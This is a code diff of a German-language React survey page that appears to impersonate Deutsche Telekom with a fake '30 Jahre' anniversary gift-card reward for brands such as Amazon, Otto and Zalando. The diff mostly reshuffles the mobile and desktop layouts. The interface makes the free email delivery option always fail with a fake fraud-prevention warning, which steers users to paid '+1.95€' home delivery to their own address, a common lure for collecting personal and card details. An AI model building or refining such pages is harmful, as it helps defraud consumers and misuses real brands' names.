+                  <div className="flex items-center space-x-2">
+                    <div className={`w-8 h-8 ${rewardStep >= 3 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm`}>
+                      3
+                    </div>
+                    <span className={`${rewardStep >= 3 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>Auswahl bestätigen</span>
+                  </div>
+                </div>
+              </div>
+
+              <div className="p-8">
+                <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                  {/* Brand Selection */}
+                  <div>
+                    <h3 className="text-lg font-semibold text-pink-600 mb-6">Marke auswählen</h3>
                     <div className="grid grid-cols-2 gap-4 mb-6">
                       {[
                         { name: 'Otto.de', brand: 'otto' },
@@ -515,64 +724,63 @@ const Survey = () => {
                         <button
                           key={item.brand}
                           onClick={() => handleBrandSelect(item.brand)}
-                          className={`aspect-square border-2 rounded-lg transition-all p-4 ${
+                          className={`p-4 border-2 rounded-lg transition-all ${
                             selectedBrand === item.brand
                               ? 'border-pink-600 bg-pink-50'
-                              : 'border-gray-300 hover:border-pink-300 bg-white'
+                              : 'border-gray-300 hover:border-pink-300'
                           }`}
                         >
-                          <div className="h-full flex flex-col items-center justify-center">
-                            <div className="h-12 flex items-center justify-center mb-2">
+                          <div className="text-center">
+                            <div className="h-8 flex items-center justify-center mb-2">
                               <img 
                                 src={brandLogos[item.brand]} 
                                 alt={item.name}
-                                className="h-12 max-w-[80px] object-contain"
+                                className="h-8 max-w-[100px] object-contain"
                               />
                             </div>
-                            <div className="text-sm text-gray-600 text-center font-medium">{item.name}</div>
+                            <div className="text-sm text-gray-600">{item.name}</div>
                           </div>
                         </button>
                       ))}
                     </div>
 
-                    {/* Mobile Gift Card */}
-                    <div className={`${currentBrand.color} text-white p-6 rounded-lg mb-6`}>
-                      <div className="flex items-center justify-between">
-                        <div className="flex items-center space-x-3">
-                          <img 
-                            src={brandLogos[selectedBrand]} 
-                            alt={currentBrand.name}
-                            className="h-8 w-8 object-contain filter brightness-0 invert"
-                          />
-                          <div>
-                            <div className="text-sm font-medium">{currentBrand.website}</div>
-                            <div className="text-xs opacity-90">30 Jahre Deutsche Telekom</div>
-                            <div className="text-xs opacity-90">Gültig in allen Telekom Shops und auf telekom.de</div>
+                    {/* Dynamic Gift Card */}
+                    <div className={`${currentBrand.color} text-white p-10 rounded-lg mb-6`}>
+                      <div className="flex justify-between items-center">
+                        <div>
+                          <div className="mb-4">
+                            <img 
+                              src={brandLogos[selectedBrand]} 
+                              alt={currentBrand.name}
+                              className="h-10 max-w-[140px] object-contain filter brightness-0 invert"
+                            />
                           </div>
+                          <div className="text-base">{currentBrand.website}</div>
+                          <div className="text-sm mt-3">30 Jahre Deutsche Telekom<br />Gültig auf {currentBrand.website.toLowerCase()}</div>
                         </div>
                         <div className="text-right">
-                          <div className="text-xs opacity-90">Geschenkkarte</div>
-                          <div className="text-2xl font-bold">{currentBrand.value}</div>
+                          <div className="text-white text-base">Geschenkkarte</div>
+                          <div className="text-white font-bold text-5xl">{currentBrand.value}</div>
                         </div>
                       </div>
                     </div>
 
-                    <h3 className="text-lg font-semibold text-pink-600 mb-2">{currentBrand.website} Geschenkkarte - {currentBrand.value}</h3>
+                    <h3 className="text-lg font-semibold text-pink-600 mt-4 mb-2">{currentBrand.website} Geschenkkarte - {currentBrand.value}</h3>
                     <p className="text-sm text-gray-600 mb-4">
-                      30 Jahre Deutsche Telekom - Wir feiern mit großartigen Angeboten und Aktionen! Nutzen Sie diese 
-                      Geschenkkarte in jedem Telekom Shop oder online auf telekom.de. Nur im Juni verfügbar.
+                      30 Jahre Deutsche Telekom - Wir feiern mit großartigen Angeboten! Nutzen Sie 
+                      diese Geschenkkarte für {selectedBrand === 'otto' ? 'Mode, Möbel und mehr' : 'Millionen von Artikeln'} auf {currentBrand.website.toLowerCase()}. Nur im Juni verfügbar.
                     </p>
                     
-                    <ul className="text-sm text-gray-600 space-y-1 mb-8">
+                    <ul className="text-sm text-gray-600 space-y-1">
                       <li>• Wert: {currentBrand.value}</li>
                       <li>• Gültig für 1 Jahr ab Kaufdatum</li>
-                      <li>• Kann für alle Telekom Produkte oder Dienstleistungen verwendet werden</li>
+                      <li>• Kann für alle Produkte auf {currentBrand.website.toLowerCase()} verwendet werden</li>
                     </ul>
                   </div>
 
-                  {/* Delivery Options Section - Mobile */}
-                  <div className="mb-8">
-                    <h2 className="text-xl font-semibold text-pink-600 mb-6">Lieferoption wählen</h2>
+                  {/* Delivery Options - Desktop */}
+                  <div>
+                    <h3 className="text-lg font-semibold text-pink-600 mb-6">Lieferoption wählen</h3>
                     
                     {/* Warning Box - Only show when E-Mail is clicked */}
                     {showEmailError && (
@@ -588,19 +796,14 @@ const Survey = () => {
                       </div>
                     )}
 
-                    {/* Email Option */}
-                    <div 
-                      className="w-full border-2 border-gray-300 rounded-lg p-4 mb-4 bg-white hover:border-red-300 transition-colors cursor-pointer"
-                      onClick={handleEmailClick}
-                    >
+                    {/* Desktop delivery options... */}
+                    <div className="w-full border-2 border-gray-300 rounded-lg p-4 mb-4 bg-white hover:border-red-300 transition-colors cursor-pointer" onClick={handleEmailClick}>
                       <div className="flex items-center justify-between">
                         <div className="flex items-center space-x-3">
-                          <div className="w-6 h-6 border-2 border-gray-400 rounded-full bg-white"></div>
+                          <div className="w-5 h-5 border-2 border-gray-400 rounded-full bg-white flex items-center justify-center">
+                          </div>
                           <div className="text-left">
-                            <div className="font-semibold text-gray-800 flex items-center">
-                              <span className="mr-2">✉️</span>
-                              E-Mail-Versand
-                            </div>
+                            <div className="font-semibold text-gray-800">📧 E-Mail-Versand</div>
                             <div className="text-sm text-gray-600">Erhalten Sie Ihre Geschenkkarte sofort per E-Mail</div>
                           </div>
                         </div>
@@ -608,27 +811,23 @@ const Survey = () => {
                       </div>
                     </div>
 
-                    {/* Home Delivery Option */}
                     <button 
                       onClick={handleHomeSelect}
-                      className={`w-full border-2 rounded-lg p-4 mb-6 transition-colors ${
+                      className={`w-full border-2 rounded-lg p-4 mb-6 transition-colors relative ${
                         selectedDelivery === 'home' ? 'border-pink-600 bg-pink-50' : 'border-gray-300 hover:border-pink-300 bg-white'
                       }`}
                     >
                       <div className="flex items-center justify-between">
                         <div className="flex items-center space-x-3">
-                          <div className={`w-6 h-6 border-2 rounded-full bg-white flex items-center justify-center ${
+                          <div className={`w-5 h-5 border-2 rounded-full bg-white flex items-center justify-center ${
                             selectedDelivery === 'home' ? 'border-pink-600' : 'border-gray-400'
                           }`}>
                             {selectedDelivery === 'home' && (
-                              <div className="w-3 h-3 bg-pink-600 rounded-full"></div>
+                              <div className="w-2.5 h-2.5 bg-pink-600 rounded-full"></div>
                             )}
                           </div>
                           <div className="text-left">
-                            <div className="font-semibold text-gray-800 flex items-center">
-                              <span className="mr-2">🏠</span>
-                              Heimversand
-                            </div>
+                            <div className="font-semibold text-gray-800">🏠 Heimversand</div>
                             <div className="text-sm text-gray-600">Erhalten Sie eine physische Geschenkkarte an Ihre Adresse geliefert</div>
                           </div>
                         </div>
@@ -636,12 +835,10 @@ const Survey = () => {
                       </div>
                     </button>
 
-                    {/* Address Selection - Show when home delivery is selected */}
                     {selectedDelivery === 'home' && (
                       <>
                         <div className="text-sm font-semibold text-pink-600 mb-4">Empfänger auswählen:</div>
 
-                        {/* Info Box */}
                         <div className="bg-blue-50 border border-blue-200 p-4 rounded-lg mb-6">
                           <div className="flex items-start space-x-2">
                             <div className="w-4 h-4 bg-blue-500 rounded-full flex-shrink-0 mt-0.5"></div>
@@ -653,7 +850,6 @@ const Survey = () => {
                           </div>
                         </div>
 
-                        {/* Address Options */}
                         <button
                           onClick={() => handleAddressSelect('meine')}
                           className={`w-full border-2 rounded-lg p-4 mb-4 transition-colors ${
@@ -661,293 +857,60 @@ const Survey = () => {
                           }`}
                         >
                           <div className="flex items-center space-x-3">
-                            <div className={`w-6 h-6 border-2 border-pink-600 rounded-full ${
+                            <div className={`w-5 h-5 border-2 border-pink-600 rounded-full ${
                               selectedAddress === 'meine' ? 'bg-pink-600' : 'bg-white'
                             } flex items-center justify-center`}>
                               {selectedAddress === 'meine' && <div className="w-2 h-2 bg-white rounded-full"></div>}
                             </div>
                             <div className="text-left">
-                              <div className="font-semibold text-gray-800 flex items-center">
-                                <span className="mr-2">👤</span>
-                                Meine Adresse
-                              </div>
+                              <div className="font-semibold text-gray-800">👤 Meine Adresse</div>
                               <div className="text-sm text-gray-600">Senden Sie die Geschenkkarte an meine Lieferadresse</div>
                             </div>
                           </div>
                         </button>
 
-                        {/* Grayed out option */}
                         <div className="w-full border-2 border-gray-200 rounded-lg p-4 mb-6 bg-gray-100 opacity-60 cursor-not-allowed">
                           <div className="flex items-center space-x-3">
-                            <div className="w-6 h-6 border-2 border-gray-400 rounded-full bg-gray-200"></div>
+                            <div className="w-5 h-5 border-2 border-gray-400 rounded-full bg-gray-200"></div>
                             <div className="text-left">
-                              <div className="font-semibold text-gray-500 flex items-center">
-                                <span className="mr-2">👥</span>
-                                Adresse einer anderen Person
-                              </div>
+                              <div className="font-semibold text-gray-500">👥 Adresse einer anderen Person</div>
                               <div className="text-sm text-gray-400">Senden Sie die Geschenkkarte direkt an den Empfänger</div>
                             </div>
                           </div>
                         </div>
+
+                        {selectedAddress === 'meine' && (
+                          <Button 
+                            onClick={handleWeiterClick}
+                            className="w-full bg-pink-600 text-white py-3 rounded-lg font-semibold text-lg hover:bg-pink-700 transition-colors"
+                          >
+                            Weiter
+                          </Button>
+                        )}
+
+                        <p className="text-xs text-gray-500 mt-4">
+                          Die Geschenkkarte wird per Post versendet und kann je nach Anbieter als Plastikkarte, 
+                          ausgedruckter Gutschein oder in einer Geschenkverpackung ankommen.
+                        </p>
                       </>
                     )}
 
-                    {/* Continue Button */}
-                    {selectedAddress === 'meine' ? (
-                      <button 
-                        onClick={handleWeiterClick}
-                        className="w-full bg-pink-600 hover:bg-pink-700 text-white py-3 rounded-lg font-semibold text-lg transition-colors"
-                      >
-                        Weiter
-                      </button>
-                    ) : (
-                      <button 
-                        className="w-full bg-gray-300 text-gray-600 cursor-not-allowed py-3 rounded-lg font-semibold text-lg"
+                    {selectedDelivery !== 'home' && (
+                      <Button 
+                        className="w-full mt-6 bg-gray-300 text-gray-600 cursor-not-allowed"
                         disabled
                       >
                         Weiter
-                      </button>
+                      </Button>
                     )}
-
-                    <p className="text-xs text-gray-500 mt-4 text-center">
-                      Die Geschenkkarte wird per Post versendet und kann je nach Anbieter als Plastikkarte, 
-                      ausgedruckter Gutschein oder in einer Geschenkverpackung ankommen.
-                    </p>
-                  </div>
-                </div>
-              </div>
-
-              {/* Desktop Layout (existing) */}
-              <div className="hidden md:block">
-                {/* Step Indicators */}
-                <div className="bg-gray-50 px-8 py-6">
-                  <div className="flex justify-center space-x-8">
-                    <div className="flex items-center space-x-2">
-                      <div className={`w-8 h-8 ${rewardStep >= 1 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm font-bold`}>
-                        1
-                      </div>
-                      <span className={`${rewardStep >= 1 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>Marke wählen</span>
-                    </div>
-                    <div className="flex items-center space-x-2">
-                      <div className={`w-8 h-8 ${rewardStep >= 2 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm font-bold`}>
-                        2
-                      </div>
-                      <span className={`${rewardStep >= 2 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>Lieferoption wählen</span>
-                    </div>
-                    <div className="flex items-center space-x-2">
-                      <div className={`w-8 h-8 ${rewardStep >= 3 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm`}>
-                        3
-                      </div>
-                      <span className={`${rewardStep >= 3 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>Auswahl bestätigen</span>
-                    </div>
-                  </div>
-                </div>
-
-                <div className="p-8">
-                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
-                    {/* Brand Selection */}
-                    <div>
-                      <h3 className="text-lg font-semibold text-pink-600 mb-6">Marke auswählen</h3>
-                      <div className="grid grid-cols-2 gap-4 mb-6">
-                        {[
-                          { name: 'Otto.de', brand: 'otto' },
-                          { name: 'H&M', brand: 'hm' },
-                          { name: 'Amazon', brand: 'amazon' },
-                          { name: 'Douglas.de', brand: 'douglas' },
-                          { name: 'Telekom', brand: 'telekom' },
-                          { name: 'Zalando.de', brand: 'zalando' }
-                        ].map((item) => (
-                          <button
-                            key={item.brand}
-                            onClick={() => handleBrandSelect(item.brand)}
-                            className={`p-4 border-2 rounded-lg transition-all ${
-                              selectedBrand === item.brand
-                                ? 'border-pink-600 bg-pink-50'
-                                : 'border-gray-300 hover:border-pink-300'
-                            }`}
-                          >
-                            <div className="text-center">
-                              <div className="h-8 flex items-center justify-center mb-2">
-                                <img 
-                                  src={brandLogos[item.brand]} 
-                                  alt={item.name}
-                                  className="h-8 max-w-[100px] object-contain"
-                                />
-                              </div>
-                              <div className="text-sm text-gray-600">{item.name}</div>
-                            </div>
-                          </button>
-                        ))}
-                      </div>
-
-                      {/* Dynamic Gift Card */}
-                      <div className={`${currentBrand.color} text-white p-10 rounded-lg mb-6`}>
-                        <div className="flex justify-between items-center">
-                          <div>
-                            <div className="mb-4">
-                              <img 
-                                src={brandLogos[selectedBrand]} 
-                                alt={currentBrand.name}
-                                className="h-10 max-w-[140px] object-contain filter brightness-0 invert"
-                              />
-                            </div>
-                            <div className="text-base">{currentBrand.website}</div>
-                            <div className="text-sm mt-3">30 Jahre Deutsche Telekom<br />Gültig auf {currentBrand.website.toLowerCase()}</div>
-                          </div>
-                          <div className="text-right">
-                            <div className="text-white text-base">Geschenkkarte</div>
-                            <div className="text-white font-bold text-5xl">{currentBrand.value}</div>
-                          </div>
-                        </div>
-                      </div>
-
-                      <h3 className="text-lg font-semibold text-pink-600 mt-4 mb-2">{currentBrand.website} Geschenkkarte - {currentBrand.value}</h3>
-                      <p className="text-sm text-gray-600 mb-4">
-                        30 Jahre Deutsche Telekom - Wir feiern mit großartigen Angeboten! Nutzen Sie 
-                        diese Geschenkkarte für {selectedBrand === 'otto' ? 'Mode, Möbel und mehr' : 'Millionen von Artikeln'} auf {currentBrand.website.toLowerCase()}. Nur im Juni verfügbar.
-                      </p>
-                      
-                      <ul className="text-sm text-gray-600 space-y-1">
-                        <li>• Wert: {currentBrand.value}</li>
-                        <li>• Gültig für 1 Jahr ab Kaufdatum</li>
-                        <li>• Kann für alle Produkte auf {currentBrand.website.toLowerCase()} verwendet werden</li>
-                      </ul>
-                    </div>
-
-                    {/* Delivery Options - Desktop */}
-                    <div>
-                      <h3 className="text-lg font-semibold text-pink-600 mb-6">Lieferoption wählen</h3>
-                      
-                      {/* Warning Box - Only show when E-Mail is clicked */}
-                      {showEmailError && (
-                        <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
-                          <div className="flex items-start space-x-3">
-                            <div className="w-4 h-4 border-2 border-red-500 rounded-full flex-shrink-0 mt-0.5"></div>
-                            <div className="text-sm text-red-700">
-                              Aufgrund von Betrügs- und Missbrauchsfällen ist ein Abgleich der Vertrags- mit der 
-                              Lieferadresse erforderlich. Deshalb wurde der Versand der Geschenkkarte per E-Mail 
-                              deaktiviert. Vielen Dank für Ihr Verständnis.
-                            </div>
-                          </div>
-                        </div>
-                      )}
-
-                      {/* Desktop delivery options... */}
-                      <div className="w-full border-2 border-gray-300 rounded-lg p-4 mb-4 bg-white hover:border-red-300 transition-colors cursor-pointer" onClick={handleEmailClick}>
-                        <div className="flex items-center justify-between">
-                          <div className="flex items-center space-x-3">
-                            <div className="w-5 h-5 border-2 border-gray-400 rounded-full bg-white flex items-center justify-center">
-                            </div>
-                            <div className="text-left">
-                              <div className="font-semibold text-gray-800">📧 E-Mail-Versand</div>
-                              <div className="text-sm text-gray-600">Erhalten Sie Ihre Geschenkkarte sofort per E-Mail</div>
-                            </div>
-                          </div>
-                          <div className="text-green-600 font-semibold">Kostenlos</div>
-                        </div>
-                      </div>
-
-                      <button 
-                        onClick={handleHomeSelect}
-                        className={`w-full border-2 rounded-lg p-4 mb-6 transition-colors relative ${
-                          selectedDelivery === 'home' ? 'border-pink-600 bg-pink-50' : 'border-gray-300 hover:border-pink-300 bg-white'
-                        }`}
-                      >
-                        <div className="flex items-center justify-between">
-                          <div className="flex items-center space-x-3">
-                            <div className={`w-5 h-5 border-2 rounded-full bg-white flex items-center justify-center ${
-                              selectedDelivery === 'home' ? 'border-pink-600' : 'border-gray-400'
-                            }`}>
-                              {selectedDelivery === 'home' && (
-                                <div className="w-2.5 h-2.5 bg-pink-600 rounded-full"></div>
-                              )}
-                            </div>
-                            <div className="text-left">
-                              <div className="font-semibold text-gray-800">🏠 Heimversand</div>
-                              <div className="text-sm text-gray-600">Erhalten Sie eine physische Geschenkkarte an Ihre Adresse geliefert</div>
-                            </div>
-                          </div>
-                          <div className="font-semibold text-gray-800">+1.95€</div>
-                        </div>
-                      </button>
-
-                      {selectedDelivery === 'home' && (
-                        <>
-                          <div className="text-sm font-semibold text-pink-600 mb-4">Empfänger auswählen:</div>
-
-                          <div className="bg-blue-50 border border-blue-200 p-4 rounded-lg mb-6">
-                            <div className="flex items-start space-x-2">
-                              <div className="w-4 h-4 bg-blue-500 rounded-full flex-shrink-0 mt-0.5"></div>
-                              <div className="text-sm text-blue-700">
-                                Wir senden Ihnen eine E-Mail mit den Versandinformationen und den Details Ihrer 
-                                Bestellung, sobald Ihre Adresse erfolgreich überprüft wurde und Sie zur Lieferung 
-                                berechtigt sind.
-                              </div>
-                            </div>
-                          </div>
-
-                          <button
-                            onClick={() => handleAddressSelect('meine')}
-                            className={`w-full border-2 rounded-lg p-4 mb-4 transition-colors ${
-                              selectedAddress === 'meine' ? 'border-pink-600 bg-pink-50' : 'border-gray-300 hover:border-pink-300'
-                            }`}
-                          >
-                            <div className="flex items-center space-x-3">
-                              <div className={`w-5 h-5 border-2 border-pink-600 rounded-full ${
-                                selectedAddress === 'meine' ? 'bg-pink-600' : 'bg-white'
-                              } flex items-center justify-center`}>
-                                {selectedAddress === 'meine' && <div className="w-2 h-2 bg-white rounded-full"></div>}
-                              </div>
-                              <div className="text-left">
-                                <div className="font-semibold text-gray-800">👤 Meine Adresse</div>
-                                <div className="text-sm text-gray-600">Senden Sie die Geschenkkarte an meine Lieferadresse</div>
-                              </div>
-                            </div>
-                          </button>
-
-                          <div className="w-full border-2 border-gray-200 rounded-lg p-4 mb-6 bg-gray-100 opacity-60 cursor-not-allowed">
-                            <div className="flex items-center space-x-3">
-                              <div className="w-5 h-5 border-2 border-gray-400 rounded-full bg-gray-200"></div>
-                              <div className="text-left">
-                                <div className="font-semibold text-gray-500">👥 Adresse einer anderen Person</div>
-                                <div className="text-sm text-gray-400">Senden Sie die Geschenkkarte direkt an den Empfänger</div>
-                              </div>
-                            </div>
-                          </div>
-
-                          {selectedAddress === 'meine' && (
-                            <Button 
-                              onClick={handleWeiterClick}
-                              className="w-full bg-pink-600 text-white py-3 rounded-lg font-semibold text-lg hover:bg-pink-700 transition-colors"
-                            >
-                              Weiter
-                            </Button>
-                          )}
-
-                          <p className="text-xs text-gray-500 mt-4">
-                            Die Geschenkkarte wird per Post versendet und kann je nach Anbieter als Plastikkarte, 
-                            ausgedruckter Gutschein oder in einer Geschenkverpackung ankommen.
-                          </p>
-                        </>
-                      )}
-
-                      {selectedDelivery !== 'home' && (
-                        <Button 
-                          className="w-full mt-6 bg-gray-300 text-gray-600 cursor-not-allowed"
-                          disabled
-                        >
-                          Weiter
-                        </Button>
-                      )}
-                    </div>
                   </div>
                 </div>
               </div>
             </div>
-          );
-        })()}
+          </div>
+        )}
 
-        {/* Original Survey Content */}
+        {/* Survey Questions */}
         {!isProcessing && !showRewards && (
           <div className="bg-white rounded-lg shadow-lg overflow-hidden mx-2 sm:mx-0">
             {/* Survey Header */}
@@ -1005,7 +968,7 @@ const Survey = () => {
                   variant="ghost"
                   onClick={handleBack}
                   disabled={currentStep === 1}
-                  className="flex items-center justify-center space-x-2 w-full sm:w-auto order-2 sm:order-1"
+                  className="flex items-center justify-center space-x-2 w-full sm:w-auto order-2 sm:order-1 touch-manipulation"
                 >
                   <ChevronLeft className="w-4 h-4" />
                   <span>Zurück</span>
@@ -1014,7 +977,7 @@ const Survey = () => {
                 {currentStep === totalSteps ? (
                   <Button
                     onClick={handleSubmit}
-                    className="flex items-center justify-center space-x-2 bg-pink-600 hover:bg-pink-700 text-white px-6 w-full sm:w-auto order-1 sm:order-2"
+                    className="flex items-center justify-center space-x-2 bg-pink-600 hover:bg-pink-700 text-white px-6 w-full sm:w-auto order-1 sm:order-2 touch-manipulation"
                     disabled={!answers[currentQuestion?.id]}
                   >
                     <span>Umfrage absenden</span>
@@ -1022,7 +985,7 @@ const Survey = () => {
                 ) : (
                   <Button
                     onClick={handleNext}
-                    className="flex items-center justify-center space-x-2 bg-pink-600 hover:bg-pink-700 text-white px-6 w-full sm:w-auto order-1 sm:order-2"
+                    className="flex items-center justify-center space-x-2 bg-pink-600 hover:bg-pink-700 text-white px-6 w-full sm:w-auto order-1 sm:order-2 touch-manipulation"
                     disabled={!answers[currentQuestion?.id]}
                   >
                     <span>Weiter</span>
